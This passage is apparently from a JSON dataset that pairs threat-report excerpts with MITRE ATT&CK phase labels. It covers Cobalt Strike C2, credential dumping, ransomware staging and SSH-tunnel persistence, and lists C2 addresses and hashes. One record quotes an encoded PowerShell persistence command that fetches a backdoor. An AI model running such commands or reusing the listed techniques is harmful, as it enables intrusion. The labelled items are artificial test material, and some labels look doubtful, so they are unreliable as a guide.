        "input": "Described attack activity: UNC5537 Targets Snowflake Customer Instances for Data Theft and Extortion | Google Cloud Blog Initial access to Snowflake customer instances often occurred via the native web-based UI (SnowFlake UI AKA SnowSight) and/or command-line interface (CLI) tool (SnowSQL) running on Windows Server 2022. Mandiant identified additional access leveraging an attacker-named utility, \"rapeflake\", which Mandiant tracks as FROSTBITE. \nWhile Mandiant has not yet recovered a complete sample of FROSTBITE, Mandiant assesses FROSTBITE is used to perform reconnaissance against target Snowflake instances. Mandiant observed usage of both .NET and Java versions of FROSTBITE. The .NET version interacts with the Snowflake .NET driver. The JAVA version interacts with the Snowflake JDBC driver. FROSTBITE has been observed performing SQL recon activities including listing users, current roles, current IPs, session IDs, and organization names. Mandiant also observed UNC5537 use a publicly available database management utility DBeaver Ultimate to connect and run queries across Snowflake instances. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Multiple C2 channels were established, some were persistent whilst others appeared to be single purpose  used for payload retrieval or fallback C2. Persistent C2 activity was Cobalt Strike. The beachhead had multiple C2 channels, two of which were unique. We assess that the threat actors were ensuring a loss of a single source C2 wouldn't result in losing all C2 to the compromised environment.\nWe observed a payload being retrieved from a unique IPv4 address. An indication that the threat actors were keeping C2 channels independent from payload delivery/retrieval.\nUsing the Curl 7.74.0 user agent:\nAnalysis of this binary, shows C2 activity to the following:\nThe binary has an unusual PDB string that indicates obfuscation:\nThe two persistent C2 channels were analyzed to determine the Cobalt Strike configuration. Each C2 channel was configured as follows:\n149.248.52[.]187:443 \nOnlineworkercz[.]com\n(added toThreat Feedon 2021-06-11)\n88.80.147[.]101:80 \ngmbfrom[.]com\n(added toThreat Feedon 2021-06-03)\nTrickbot C2 Configuration:\nhttps://tria.ge/210610-vfygj4t1yn",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Mandiant observed APT29 quickly moving laterally within an environment. To facilitate lateral movement APT29 relied on a combination of malicious certificates used for impersonation of privileged users and SMB BEACON. \nAPT29 was first observed moving laterally after the group was seen staging and deploying SMB BEACON to multiple systems. To facilitate the staging of BEACON on remote systems APT29 utilized a malicious certificate that allowed the group to impersonate a privileged user. The first evidence of SMB BEACON being deployed was seen through the local staging of a zip file shortly following the successful execution of BOOMMIC. \nAnalysis of SharedReality.dll identified it to be a memory-only dropper written in Go language that decrypts and executes an embedded BEACON payload. The BEACON payload was identified to be SMB BEACON that communicates over the following named pipe: \n\\\\.\\pipe\\SapIServerPipes-1-15-21-07836 \nAPT29 was then observed utilizing the   \nimpersonation of a privileged user to copy   \nSharedReality.dll to the Temp directory of multiple systems. The group then deployed it via a scheduled task named SharedRealitySvcDLC which was   \ninstalled and executed. After executing the   \nscheduled task, the task was then immediately   \ndeleted. ",
        "output": "lateral movement",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The IcedID infection came as a result of a phishing campaign as reported byMyrtuson Twitter.\nInitial IcedID was executed on the beachhead usingregsvr32.exe\nAutomated analysis of this IcedID sample extracts the following configuration for the staging server:\nIcedID core analysis show additional C2 infrastructure as perthissample:",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the beginning stages of the intrusion, the NetSupport deployment script was used to establish persistence using the Run key under the user registry hive. For more details, see the Execution section.\nSince the deployment script was PowerShell based, the source process of the registry activity will appear aspowershell.exe.\nIn addition, a scheduled task was created to launch OpenSSH SSH Server with a specific configuration altered to make OpenSSH listen locally on port 2222 instead of 22.\nFollowing the previous command, another scheduled task was created to establish a reverse SSH tunnel to the attacker's server. See the lateral movement section to understand how this aided the attacker's activities.\nThe entire process related to OpenSSH and its persistence was automated by the threat actors through a script namedinstall.bat. In this case, the script generated a new private key usingssh-keygenand corrected the permissions on the file usingicacls;this is required because if the permissions are too open on the private key, SSH will exit with an error. More details regarding the SSH tunneling command executed within the scheduled task can be seen under theCommand and Controlsection.\nThe threat actor created a local user account and added the user to the Administrators and Remote Desktop Users groups. The newly created user account was namedWDAGUtilityAccount2to blend in with the default user accountWDAGUtilityAccountpresent on Windows.\nLastly, the threat actor made use of NIM based tools to authenticate via pass-the-hash and to create a new local administrator user.\nThe following demonstrates the possible command line parameters of this tool.\nLooking at the strings present in the files we can discover that these are compiledNIMbinaries.\nSifting further through the strings, we stumble on the command used to create the user account.\nWe can also see the command that was used to attempt to add the user to the administrators group.\nWe did not observe any backdoor account created after execution. When we performed our own testing, we saw the tools failed to work and would return an error rather than create an account.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: A quick look atdocument.lnk's properties highlight the command line that is executed on launch:\nBut we can do a lot better than that with a .lnk file! These .lnk files provide a wealth of knowledge to investigators. For example, below is a partial output of the toolLECmd.exe(byEric Zimmerman). When used on the filedocument.lnk, it parses out metadata such as when the shortcut file was made, what hostname and the MAC Address of the device it was created on and even the directory path of the user that created it!\nWe were able to determine when the user clicked on the lnk file and when a new process was created with the command line mentioned above. Furthermore, the Event ID4663in Security.evtx highlighted whenexplorer.exeaccesseddocument.lnk:\nAdditionally, the context of execution location and parent process can also be used to follow the user execution process.\nShortly after execution of the payload, several child processes were spawned that created persistence and began discovery on the host.\nThis included an instance ofC:\\Windows\\SysWOW64\\cmd.exe, which the IcedID malware used to hollow out and then inject a Cobalt Strike beacon into. There were several additional indications of Cobalt Strike we observed to verify it was utilized by the threat actor. Thecmd.exeprocess spawned a suspicious instance ofrundll32.exe. There were no command line arguments for this process which is atypical forrundll32.exe.A further indication was therundll32.exeprocess creating a named pipe,postex_304a.This behavior ofrundll32.exeand a named pipe that matchespostex_[0-9a-f]{4}, is the default behavior used by Cobalt Strike 4.2+ post exploitation jobs. For more information on Cobalt Strike, you can read our articleCobalt Strike, a Defender's Guide.\nWhen we reviewed the memory of this process, we were able to confirm it was in fact Cobalt Strike when we successfully extracted the beacon configuration (additional details can be found in theCommand and Controlsection). The threat actor also executed a PowerShell Cobalt Strike payload on some servers:\nThis payload is using the default Cobalt Strike obfuscation scheme (XOR 35),and can easily be decoded usingCyberChef:\nThe output can be analyzed using scdbg to highlight what Windows API calls the shellcode makes:\nPrior to using the PowerShell beacon the threat actor dropped a DLL beacon on the server (p227.dll), but this appears to have failed for unknown reasons after which, the threat actor moved on to the PowerShell beacon which executed successfully.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Look for command-and-control connections. Run query in Microsoft Defender for Endpoint. \nLook for network connections to known command and control domains. Run query in Microsoft Defender for Endpoint. ",
        "output": "command and control",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The phishing email shown in Figure 2 is part of this attack campaign. It targets staff members, implying that a payment is underway and encourages them to click a button to verify payment information. Upon clicking the button, a harmful JAR file hosted on AWS is downloaded to the victim's computer.",
        "output": "initial access",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Hostname:\nfreshinxworm[.]ddns[.]netchurchxx[.]ddns[.]netplunder[.]ddnsguru[.]complunder[.]dedyn[.]ioplunder[.]jumpingcrab[.]complunder[.]dynnamn[.]ru\nIP Address:\n95[.]214[.]27[.]17\nFiles:\n40c9d3dec84aa057c167005f860749a2cfa55faa0cddd2fe39aaf3906819203c5a47b18066d8dcd0fbc524f529002cf0a270d8394de928e8426fa06959a8270440041c3240eaa39da781a68f6a60f93577f1b0bbdaee5a0297d7fe329c073baa908656aecc2ae845249acb392fbaa5ba3f8d26b05f4d762afb85b622f7eadcf0ca0efb6da9edbe627ab206a7f494adb42f8483da1d574ddb8f723c1ddfeaecc409505b5cf1541b783f14b1bf1403b918fae70f049d72f47439bd068a43ed8e0a88aeb09dcc59858c9969b7ae1e0e2b58f0aa90b2d27a5edfe9cd82e602ed5952f44e495e1301866188a62916859075ed73d13193823c69884312f04785707279d7e684fe7f3729edd70e2855528af3e634789155d687ed98911d1d2f0200d2a66c6da5a649f9165834c24ac8f7e2332a5612eda54312dcc9f107ab29182e58c9b499cdefac0faa328775ebb6e64b351ee43498532f987743a5a6dcfd5266f20f58235e47d5f5b8218da1d5e9dd3449c4f8969f038bba018521f9884fa1cdf693dd806527cd56244208ee530ee26c90004eb7af343ffdb618c031f63cb1d0e2409ce4e79962ec3e5a307282afcb72b4da39c4a2aace29f3f85c060d8c07cf390547e238a43f9cc38f2d4e449c7d8a557b990e60773ad02820717a634c22b609bec4e613ee1365d8561be02525896c095c8a3fda3199f2f615ab32a644f3d90451b54a4f92b1081f0c10a41c2404d51ed340181c485751efb974113a5cf401ad9cb26144c6e42601f1f1be09ece7c7fcb127637db3b953065648d1b1f371da7e8a904343ba2502d390b36403181e77192a62f31e98c87eb91906fbae27019b4c0d98ab2fc44063d4e00f221e502419d9cca598fafb9e1e00352149327267604bc1\nLearn more about Fortinet'sFortiGuard Labsthreat research and global intelligence organization and Fortinet's FortiGuard AI-powered Security Servicesportfolio.",
        "output": "other",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the credential access phase, the threat actor leveraged the injected process WUAUCLT to access the LSASS memory space on the beachhead, a file server, and a backup server. The access permissions granted were 0x1010 and 0x1fffff, both of which are indicative of credential theft activities.\nThe code 0x1010 is broken down as follows:\n0x00000010 (VMRead):Grants the ability to read memory from a process. \n0x00001000 (QueryLimitedInfo):Allows retrieval of certain process-related information.\nIn contrast, the code 0x1fffff provides full access rights to a process, making it a clear indicator of credential-stealing tools. A suspicious CallTrace marked with UNKNOWN also revealed injected code activity.\nAdditionally, the threat actor attempted to use NTDSUtil via PowerShell remoting to extract credentials. However, this attempt was prevented by Windows Defender.\nAttempted NTDS.dit dump:\nWindows Defender event logs indicate that an attempt to dump credentials was blocked:\nOn a backup server, the threat actor executed a PowerShell script named Veeam-Get-Creds.ps1. This script is publiclyavailable on GitHubas a method of recovering passwords from the Veeam Backup and Replication credential manager.\nAdditionally, while on a file server, the threat actor was able to locate a file pertaining to shared account(s):",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The LSASS process was accessed by an unusual process \"searchindexer.exe\" on beachhead right before the lateral movement was observed. Searchindexer.exe is a legitimate Windows process responsible for the indexing of files or Windows searches.\nThis technique is known to be used by Cobaltstrike which inject malicious code into a newly spawned searchindexer process to evade detection. This is associated with MITRE ATT&CK (r) Tactic(s): Defense Evasion and Technique(s): T1036.004.\nThe Sysmon logs captured in our case below can be used to detect this type of activity.\nThe threat actors created a full backup of the active directory in \"IFM\" media mode and dumped the password hashes along with the corresponding users.\nThey also employed the NtdsAudit tool immediately after using NTDSutil to dump the password hashes of all domain users. NtdsAudit requires the \"ntds.dit\" database file and SYSTEM registry file for extracting the password hashes and usernames. After providing these as arguments, they exported the password hashes in a file that they named \"pwdump.txt\" and the user details in a csv file called \"users.csv\". After obtaining the password hashes, the threat actors can crack the passwords hashes using a program such as hashcat.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We assess with medium to high confidence that the initial access was a result of malicious, macro-enabled, Word document that was sent as an attachment to the targets of a phishing campaign.\nBradreported on similar BazarLoader activity initiated from malicious TA551 Word Doc email campaign that resulted in Cobalt Strike beacons.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor's primary objective in this case was financial gain through ransom. They introduced an executable named qwe.exe, which we later identified as BlackSuit ransomware.\nThis ransomware was strategically distributed across key endpoints within the infrastructure and executed, initiating the ransom demands.\nWindows security eventID 5145 shows the distribution of the BlackSuit ransom executable via SMB C$ shares:\nTo avoid any errors during the final stage of their operation, the threat actor refrained from manually typing the command to execute the ransomware with the necessary command line arguments. Instead, to ensure accuracy and eliminate the risk of typos, they also moved a file named 123.txt along with qwe.exe, likely using it as a script or reference to guarantee the correct execution of the ransomware.\nWindows security eventID 5145 shows distribution of 123.exe to the c:\\users directory:\nMovement of the 123.txt file seen from the network side. Including the content. The id is redacted.\nAfter staging the ransomware executable qwe.exe and the helper file 123.txt, the threat actor used RDP from DC X to log onto various systems. Once logged in, they opened 123.txt in Notepad, copied the command from the file, and executed the ransomware. This method ensured the correct command line arguments were used, reducing the risk of mistakes during the final execution phase.\nSysmon eventID 1 showing notepad.exe opening 123.txt:\nSysmon eventID 1 showing execution of qwe.exe\nOnce the ransomware was executed a lot of ransom notes where created:\nreadme.blacksuit.txt looked like:",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This section outlines how the threat actors obtained credentials. To do so, APT41 uses several different, fairly popular techniques. ",
        "output": "credential access",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1071: Application Layer Protocol   \nT1071.004: DNS   \nT1090.003: Multi-hop Proxy   \nT1568.002: Domain Generation Algorithms   \nT1571: Non-Standard Port   \nT1573.001: Symmetric Cryptography ",
        "output": "command and control",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Financially motivated threat actors will continue to use WikiLoader as a loader for rent in a variety of campaigns where they require a robust, stealthy Windows loader that pays reasonable attention to OPSEC.\nWhat remains to be seen is why threat actors have shifted from phishing to SEO poisoning to deliver WikiLoader. One hypothesis is that another initial access broker (IAB) has begun to work with WikiLoader to operationalize its delivery through SEO poisoning in recent months. Alternatively, groups that are publicly tracked using WikiLoader could have shifted to SEO poisoning from phishing after an improvement in endpoint security controls or industry reporting disrupted their operations.\nWhile SEO poisoning is not a new technique, it continues to be an effective way to deliver a loader to an endpoint. Spoofing trusted security software is likely to assist in bypassing endpoint controls at organizations that rely on filename based allow listing.\nThe combination of spoofed, compromised and legitimate infrastructure leveraged by WikiLoader campaigns reinforces the malware authors attention to building an operationally secure and robust loader, with multiple C2 configurations. The authors suspect that we will likely see continued WikiLoader use throughout 2024 and beyond.\nRegardless of the anti-analysis and EDR evasion techniques employed by WikiLoader, the procedures employed can be identified using many common endpoint threat hunting methods. We share a selection of four queries in our appendix that organizations can use to hunt for WikiLoader with high fidelity in endpoint data. The queries can be expanded in scope with minimal changes from XQL users to cast a wider net, or narrow in on threats that may be more applicable to an organization's environment.\nGoogle has confirmed that all sites mentioned in this article are known to Safe Browsing. Any user that visits these sites will receive a warning of potential security risks.\nPalo Alto Networks Protection and Mitigation\nPalo Alto Networks customers are better protected from the threats discussed above through the following products:\nNext-Generation FirewallwithCloud-Delivered Security Services, includingAdvanced WildFire, detect the files mentioned within this report as malicious. AdditionallyAdvanced URL FilteringandAdvanced DNS Securityidentify known URLs and domains associated with this activity as malicious. \nCortex XDRcustomers are better protected against the sideloads and shellcode injection attempts mentioned in the article. Cortex XDR detects and prevents these malware activities based onBehavioral Threat Protection, AI-driven local analysis, analytics profiles and other security engines across Windows, Linux and Mac systems. \nPrisma Cloud can detect known WikiLoader binaries executed from within cloud environments through theCloud Security Agent (CSA).\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: UNC4841 was observed conducting reconnaissance activity in a small number of cases. In these cases, the actor utilized open-source tools such as fscan to the ESG for host detection, port scanning, web fingerprint identification, web vulnerability scanning, domain control identification, and other functions. The following figure shows an example output from the fscan tool. In one environment, the actor \nscanned over 50 subnets over the course of nine days with approximately $80\\%$ of these being completed in one day. \n<redacted>::25 open   \n<redacted>:25 open   \n<redacted>:587 open   \n<redacted>:443 open   \n[\\*] NetInfo:   \n[\\*]<redacted> [->]<redacted> [->]<redacted>   \n[\\*] WebTitle: https://<redacted> code   \n<redacted>:25 open   \n<redacted>:443 open   \n$[^{*}]$ LiveTop <redacted>/16 \u6bb5\u5b58\u6d3b\u6570\u91cf\u4e3a:   \n[\\*] LiveTop <redacted>/16 \u6bb5\u5b58\u6d3b\u6570\u91cf\u4e3a:   \n[\\*] LiveTop <redacted>/16 \u6bb5\u5b58\u6d3b\u6570\u91cf\u4e3a:   \n<redacted>:25 open   \n<redacted>:587 open   \n<redacted>:53 open   \n<redacted>:389 open ",
        "output": "lateral movement",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Gootloader\nA scheduled task was created during the initial Gootloader execution. This task was run on demand to execute the next stage in the Gootloader malware chain, and setup a Logon Trigger to maintain persistence on the beachhead.\nSystemBC\nLater in the intrusion the threat actor deployed a SystemBC PowerShell script. They setup persistence for this script by using an autorun key named 'socks_powershell'",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We assess with moderate confidence that thisDLLwas dropped by a malicious Office document.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA observed the threat actor using the techniques identified in table 4 to establish persistence. \nTable 4: Persistence techniques ",
        "output": "persistence",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Before diving into the details, we'll discuss the ConnectPort X2e device (referred to as X2e device throughout the post) at a high level. The X2e device is a programmable gateway that connects to and collects data from ZigBee devices. It is commonly used as a Smart Energy gateway to interpret and send energy readings from a residential Solar Inverter. Vendors will often purchase an X2e device and configure it to read power consumption \ngenerated by a customer's Solar Inverter. Figure 1 outlines a typical residential solar installation and highlights the X2e's role. \nFor our research, we focused on the X2e device used by SolarCity, now Tesla, to retrieve data from residential solar installations. A typical setup would involve SolarCity providing a customer with a gateway that would be connected to the Internet via an Ethernet cable on the customer's home network. Figure 2 shows one of the SolarCity branded X2e devices that we tested. \nWithout even plugging in the X2e device, we know of at least two separate interfaces to explore: the Ethernet interface and the ZigBee radio. Note that we did not review the ZigBee interface between the X2e and a solar invertor, and that interface will not be covered in either Part One or Part Two of this series. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Process injection was observed during the intrusion by both Emotet and Cobalt Strike. Emotet injected multiple times into svchost to execute certain functions, including discovery commands.\nCobalt Strike used process hollowing to launch under the context of the Dllhost.exe process. We later saw Dllhost.exe injecting into multiple other processes, such as explorer.exe and svchost.exe, to execute further payloads.\nScanning process memory across affected hosts reveals both the direct Cobalt Strike processes and the injected processes using theMalpedia yara rule.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As the threat actors were perusing files, we received a notification that one of our files had been remotely opened from 46.38.235.14.\nThe threat actors later exfiltrated sensitive documents from domain joined file servers using the Rclone application. The destination of the exfiltrated data was Mega.io.\nThe above command was copied and pasted by the threat actors to exfiltrate the data. Prior to the correct command, the threat actors accidentally pasted a command from a previous intrusion. That command contained a different victim organization in the arguments showing through out the intrusion continued sloppiness of the threat actor.\nBreaking down the Rclone command line arguments:\nReference:\nA great reference for detecting Rclone data exfiltration is the article from nccgroup:Detecting Rclone  An Effective Tool for Exfiltration and from Red Canary Transferring Leverage in a Ransomware Attack.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attackers exploited previously compromised accounts of victims and their contractors, and created privileged local accounts, particularly when exploiting the business automation software server. If a user has sufficient permissions to remotely execute commands on the server, this software allows running a child command prompt process, such as cmd.exe, with privileges in the operating system corresponding to the program's privileges. Since business automation software typically has administrator privileges in the OS, the child process also becomes privileged. The attackers exploited this opportunity: after gaining access to the vulnerable software server, they created a privileged local account on whose behalf they launched a command interpreter. ",
        "output": "privilege escalation",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor routinely cleared relevant logs, including .bash_history, auth.log, lastlog, wtmp, and btmp, where applicable, to obfuscate their activities. Shell access was restored to a normal state in many cases through the use of the \"guestshell disable\" command. \nThe threat actor modified authentication, authorization, and accounting (AAA) server settings with supplemental addresses under their control to bypass access control systems. ",
        "output": "defense evasion",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: QBot details  24.229.150.54 // 41.228.22.180\nHere is the initial access DLL (Qbot) information fromTria.ge\nCobalt Strike details  5.255.98[.]144\nThis Cobalt Strike server was added to ourThreat Feedon 2021-11-16.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the beachhead system, the initial payload setup.exe was executed with High integrity level, which means that the binary was run with the access level equivalent to Administrator access.\nAn injected cmd.exe process from the beachhead host opened winlogon.exe with an access mask of 0x143A, which, when decoded, revealed the PROCESS_VM_WRITE permission. The cmd.exe process then executed process injection into winlogon.exe.\nAll scheduled tasks created by the threat actor were setup to run in SYSTEM context ensuring that access would stay elevated on hosts.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ATT&CK Technique: Create or Modify System Process (T1543) \nIn many big-game hunting ransomware attacks, upon achieving initial access into the target environment, the adversary will first attempt to achieve persistence so that they can regain access to the environment if they are detected or their initial point of access is otherwise removed. In this particular case, we observed the adversary leveraging a Windows Service to execute PowerShell to stay persistent in the environment. \nThe Windows service was configured with the following options: \nService Type: user mode service Service Start Type: demand start Service Account: LocalSystem Service Name: Updater \nService Filename: \n%COMSPEC% /C start /b %WINDIR%\\System32\\WindowsPowershell\\v1.0\\powershell noP -sta -w 1 -enc [BASE64 ENCODED BLOB] \nAs can be seen above, the PowerShell being executed was Base64 encoded. The decoded PowerShell instructions are below: \nDownloading, decrypting, and executing a backdoor payload from an attacker-controlled server. By implementing this persistence, the attacker can regain access to the environment if the targeted organization destroys their initial means of access. ",
        "output": "persistence",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Windows Defender AV Real-Time Monitoring was disabled on the beachhead and one of the domain controllers using Set-MpPreference cmdlet.\nThe PowerShell script, checking.ps1, is explained in the Execution section which contained other ways to disable AV, including registry modifications and service disabling.\nA PowerShell script named del.ps1 attempts to terminate system utilities such as Process Explorer, Task Manager, Process Monitor, and Daphne Task Manager.\nIn the scriptchecking.ps1the threat actor created 16 different tasks on the hosts where Tor2Mine was deployed. These tasks were named in a manner to try and blend in with various Windows tasks that on the hosts:",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Cobalt Strike jump psexec(Run service EXE on the remote host)produced a 7045 System Windows event on remote hosts. Example:\nBelow, the network traffic shows the SMB lateral transfer of one of the Atera Agent MSI installers (1.msi) used to gain access laterally on a host and provide persistence for later access.\nThe same can be observed for other payloads used during the intrusion as well; here we can see that same data using Zeek logs when the threat actors transferred the 1.dll Cobalt Strike beacon laterally to gain access to additional hosts.\nWe also observed Pass-The-Hash used throughout the intrusion via the Cobalt Strike Beacons. Threat actors used PTH to acquire a session with elevated user access. We observed the below logs being generated on the source host and domain controller that indicate the use of PTH.\nSource Host:\nDomain Controller:\nYou can read more about detecting \"Pass-The-Hash\"hereby Stealthbits andhereby Hausec.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Using compromised domain admin credentials, the threat actor used Remote Desktop Protocol (RDP) and PowerShell remoting to obtain access to other servers in the environment, including domain controllers. ",
        "output": "lateral movement",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Bazar quickly moved into a Werfault process to handle command and control communication avoiding making any network connections directly.\nProcess injection was also seen in other key system executables such as winlogon.exe.\nCobalt Strike was seen locking access to SMB beacons.\nAnchor was also seen triggering process tampering.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial Access began with a ZIP file delivered to a victim through email. This email campaign was observed in the wild occurring between late December 2022 through mid January 2023 according toBrad/@malware_traffic(Thanks Brad!). An earlier sample was documentedhereusing aUSPS delivery themewith some overlap in command and control present between the intrusions. Once the ZIP file is extracted the user is presented with a JavaScript file.\nOnce the user clicks on the JavaScript file, WScript will invoke the script.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon execution of the MSDT payload, a new instance of thesdiagnhost.exe(Scripted Diagnostics Native Host) was spawned. This process was ultimately responsible for invoking the Follina payload, starting, in our case, three child instances ofregsrv32.exe.\nAfter execution of the payload, the XML filePCW.debugreport.xmlwas created in the%localappdata%\\Diagnostics.directory. This file can serve as a valuable artifact when analyzing Follina exploitation (attempts). The payload, preceded by its recursive path, can be found in theTargetPathelement of this XML-file. Thepayloadconfigured to execute on the system is embedded in this file.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Cobalt Strike C2 #1:\nExtracted Cobalt Strike Config:\nCobalt Strike C2 #2:\nTrickbot Mor1",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
